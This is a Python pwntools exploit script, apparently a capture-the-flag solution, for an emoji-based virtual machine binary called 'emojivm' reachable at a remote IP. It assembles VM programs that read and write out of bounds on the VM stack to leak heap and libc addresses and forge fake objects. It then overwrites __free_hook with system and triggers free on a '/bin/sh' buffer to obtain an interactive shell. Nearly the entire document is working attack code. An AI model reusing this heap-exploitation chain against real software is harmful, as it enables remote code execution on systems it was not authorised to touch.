import os
import struct
import sys
import subprocess
from pwn import *
context.update(arch='amd64')

cwd = './'
REMOTE = True


def wait_for_gdb():
    s = '''#make a 1 long object - this is just about stalling for gdb
#SP = -1
PUSH_EMOJI 1
#SP = 0
NEW
#SP = -1
#read into object 0
#this will also stall execution so i can gdb.... FUCK THIS SUCKS FUCK FUCK FUCK
PUSH_EMOJI 0
#SP = 0
READ
#SP = -1
#delete object 0, just so that we can go back to zero
PUSH_EMOJI 0
#SP = 0
FREE
#SP = -1
'''
    return s

def leak_heap():
    s = """#now make a 1500 long object on the valid stack and leak its address
PUSH_EMOJI 10
#SP = 0
PUSH_EMOJI 5
#SP = 1
ADD
#SP = 0
PUSH_EMOJI 10
#SP = 1
MUL
#SP = 0
PUSH_EMOJI 10
#SP = 1
MUL
#SP = 0 ([SP] = 1500)
NEW
#SP = -1
#now we can leak this object's address
#slide the stack by minus 10. starts at -1 now, so it becomes -11.
POP_INT64
POP_INT64
POP_INT64
POP_INT64
POP_INT64
POP_INT64
POP_INT64
POP_INT64
POP_INT64
POP_INT64
POP_INT64
#slide stack by one more and read it -> reading from -12 is the first index of gptr_array
POP_INT64
#SP = -13
#now push 12 0s, so that we adjust the SP back to the beginning
PUSH_EMOJI 0
PUSH_EMOJI 0
PUSH_EMOJI 0
PUSH_EMOJI 0
PUSH_EMOJI 0
PUSH_EMOJI 0
PUSH_EMOJI 0
PUSH_EMOJI 0
PUSH_EMOJI 0
PUSH_EMOJI 0
PUSH_EMOJI 0
PUSH_EMOJI 0
#SP = -1
"""
    return s

'''
starts from SP == -1
we write the number 2112, because obj1 occupies 16 bytes on the heap, obj1->buf comes after, and 8 bytes are the ptmalloc chunk header.
so the obj1 pointer becomes the fake obj1 pointer instead obj1->buf, which we make it so that its buf that points to obj2->buf, this will leak us a libc ptr
'''
def write_number_into_gobj_0():
    s = '''#we use gobj[0] and gobj[1] to create a number (40) into gobj[0] and then 0 out gobj[1], then go back to SP == -1
POP_INT64
POP_INT64
POP_INT64
POP_INT64
POP_INT64
POP_INT64
POP_INT64
POP_INT64
POP_INT64
POP_INT64
POP_INT64
POP_INT64
#SP = -13 (10 goes into -12)
PUSH_EMOJI 2
PUSH_EMOJI 10
MUL
PUSH_EMOJI 1
ADD
PUSH_EMOJI 10
MUL
PUSH_EMOJI 1
ADD
PUSH_EMOJI 10
MUL
PUSH_EMOJI 2
ADD
#SP = -12
#now go back to -1
PUSH_EMOJI 0
PUSH_EMOJI 0
PUSH_EMOJI 0
PUSH_EMOJI 0
PUSH_EMOJI 0
PUSH_EMOJI 0
PUSH_EMOJI 0
PUSH_EMOJI 0
PUSH_EMOJI 0
PUSH_EMOJI 0
PUSH_EMOJI 0
'''
    return s

'''
starts from SP == -1
we now allocate a 16 byte long bufer into gobj1 and fill its buf with a fake_obj
'''
def alloc_gobj1():
    s = """#alloc an obj, size doesnt matter much, we will modify the gobj[1] ptr to point inside gobj3 anyway
PUSH_EMOJI 10
#SP = 0
NEW
#SP = -1, gptr[1] = malloc(11)
"""
    return s

'''
starts from SP == -1
now we add the number in gobj0 and the pointer in gobj1 into gobj0, so that gobj0 now actually points to gobj3->buf, so we get a fake object, which will point inside gobj2.
we have to 0 out gobj1 in the process but that's fine.
'''
def modify_gobj0():
    s = """#pop the stack down all the way to the gobj1 and then modify it with an add
POP_INT64
POP_INT64
POP_INT64
POP_INT64
POP_INT64
POP_INT64
POP_INT64
POP_INT64
POP_INT64
POP_INT64
#SP = -11
ADD
#SP = -12
PUSH_EMOJI 0
PUSH_EMOJI 0
PUSH_EMOJI 0
PUSH_EMOJI 0
PUSH_EMOJI 0
PUSH_EMOJI 0
PUSH_EMOJI 0
PUSH_EMOJI 0
PUSH_EMOJI 0
PUSH_EMOJI 0
PUSH_EMOJI 0
#SP = -1
#now we have in obj0 a pointer that will point inside the new obj1 (as of yet not allocated ofc), and then all other slots are 0s
"""
    return s


def realloc_gobj1():
    s="""#alloc and fill a new object, the goal is for it to contain a fake obj. so it needs size 16
#SP = -1
PUSH_EMOJI 10
#SP = 0
#we allocate request 15, so that it becomes 16
PUSH_EMOJI 5
#SP = 1
ADD
#SP = 0
NEW
#SP = -1
#now push idx 1 and then read into this guy the fake object
PUSH_EMOJI 1
#SP = 0
READ
#SP = -1
"""
    return s

'''
TODO: read out the libc pointer via gobj1->buf
'''
def leak_libc():
    s = """#issue a POP_OBJ on gobj0 to leak out the libc address!
#SP = -1
PUSH_EMOJI 0
#SP = 0
POP_OBJ
#SP = -1
"""
    return s

'''
TODO: modify gobj1->buf in the intended way with READ, so that obj1's fake obj gets modified and we change its buf into libc
'''
def modify_gobj1():
    s ="""#write into obj1, so that obj0 fake_obj gets modified
#SP = -1
PUSH_EMOJI 1
#SP = 0
READ
#SP = -1
"""
    return s

def modify_gobj0_content():
    s ="""#write INTO obj0, so that the free_hook gets modified
#SP = -1
PUSH_EMOJI 0
#SP = 0
READ
#SP = -1
"""
    return s


'''
TODO: write into libc->free_hook via obj1's fake obj, then write into gobj3->buf via the normal method with READ the "/bin/sh" so that when we trigger a free on obj1, we win
'''
def call_free():
    s = """#call a free in OBJ1
#SP = -1
PUSH_EMOJI 1
#SP = 0
FREE
#SP = -1
"""
    return s

def exit():
    return "EXIT"

evm_src =  wait_for_gdb() + leak_heap() + write_number_into_gobj_0() + alloc_gobj1() + modify_gobj0() + realloc_gobj1() + leak_libc() + modify_gobj1() + modify_gobj0_content() + modify_gobj1() + call_free() + exit()

p = os.path.join(cwd, 'emoji_leak.src')
f = open(p, "w")
f.write(evm_src)
f.close()

#cat the emoji_leak.src just so we show it
#subprocess.call(["cat", "emoji_leak.src"])

#compile the EVM program
subprocess.call(["python3", "emoji_assembler.py", p, "emoji_leak.evm"])

#run the EVM
b = os.path.join(cwd, 'emojivm')

if REMOTE:

    r = remote('3.115.176.164', 30262)
    print "POW line: %r" % r.recvline()
    r.recvuntil('hashcash -mb25 ')
    hashcashChall = r.recvline().strip()
    print "Running HashCash on the following challenge: %r..." % hashcashChall
    hashcashToken = subprocess.check_output("hashcash -mb25 %s" % hashcashChall, shell=True).strip()
    print "HashCash token: %r" % hashcashToken
    r.sendlineafter('hashcash token:', hashcashToken)
    with open('emoji_leak.evm', 'rb') as f: payload = f.read()
    r.sendlineafter('Your emoji file size: ', str(len(payload)))
    r.sendafter('Input your emoji file:', payload)
    r.recvline()
    #r.interactive()

else:
    r = process([b, 'emoji_leak.evm'], cwd=cwd, aslr=True)
    gdb.attach(r)

r.send("A") #this is pointless, we just hold up the execution with this so that gdb has time to attach and we can inject breakpoints
               #next the VM deletes this object and we can start from 0, but with a debugger.

# STEP 1 HEAP LEAK


#now we need to leak the heap address so that we can create a fake object
throwaway = r.recvn(11)
print "recv'd %d throwaway bytes" % len(throwaway)

leak = r.recvn(14)
print leak
addr = int(leak, 10)
print "heap leak: 0x%016x" % addr
heap_base = addr - (0x9a850-0x87000)
print "heap base: 0x%016x" % heap_base

# STEP 2 SETUP NUMBER IN GOBJ[0]

#now we write a number into gobj[0]. we need to throwaway the pops that are a result of this.
throwaway = r.recvn(12)
print "recv'd %d throwaway bytes" % len(throwaway)


# STEP 3 ALLOC GOBJ1

#no need to send or recv anything for this step

# STEP 4 MODIFY GOBJ0 PTR and zero out GOBJ[1-10]

throwaway = r.recvn(10)
print "recv'd %d throwaway bytes" % len(throwaway)

#so far so good - we have corrupted the pointer!

# STEP 5 REALLOC OBJ 1 and fill it with a fake obj

heap_addr_with_unsorted_fd = (0x55d35f4f80d0 - 0x000055d35f4f7850) + addr
fake_obj = p64(0x400) + p64(heap_addr_with_unsorted_fd)
r.send(fake_obj[0:15]) #because we allocate to 15, we have to send 15, we don't need the top 00 byte actually so no need to rewrite everything now

#if everything went correctly, then we now have a fake obj inside obj1->buf, which is where obj0 points.

# STEP 5 LIBC LEAK

# the VM calls a POP_OBJ, which will write out 6 bytes. so we read that to get the libc pointer

fake_obj_content = r.recvn(6)
libc_pointer_val = fake_obj_content + "\x00\x00"
libc_pointer = struct.unpack("<Q", libc_pointer_val)[0]
print "libc leak: 0x%016x" % libc_pointer
libc_base = libc_pointer - (0x00007f8ad3908ca0 - 0x7f8ad351d000)
print "libc base: 0x%016x" % libc_base
free_hook = libc_base + (0x7f8ad390a8e8 - 0x7f8ad351d000)
print "free hook: 0x%016x" % free_hook


# STEP 6 MODIFY GOBJ1 to change the FAKE_OBJ to point to FREE_HOOK

#now we first write into obj1 16 bytes
new_fake_obj = p64(8) + p64(free_hook)
new_fake_obj = new_fake_obj[0:15]
for i in range(0, len(new_fake_obj)):
    print "0x%02x" % ord(new_fake_obj[i])
r.send(new_fake_obj) #actually we need to send 15 bytes here not 16, okay whatever.

#OK - now we have modified the ptr, we are going to write into free_hook 8 bytes.

# STEP 7 modify free_hook

#then we write INTO obj0, to modify the free_hook
system = (0x7fe1e4f35440 - 0x00007fe1e4ee6000) + libc_base
fake_content = p64(system)
r.send(fake_content)

# STEP 8 write "/bin/sh" into obj1->buf

#at this point, we are supposed to have system() into free_hook. So now if we free obj, we should win. Of course we should modify obj1 again, so that the buf has "/bin/sh" in it

fake_buf_cnt = "/bin/sh\x00" + p64(0)
r.send(fake_buf_cnt[0:15])

#that's it. now it will call free on obj1, which first does a free(obj1->buf) which means system("/bin/sh")

# STEP 9 call free to win -> doesn't need any input

r.interactive()

'''
vmbin = sys.argv[1]
with open(vmbin) as f:
    r.send(f.read())
'''
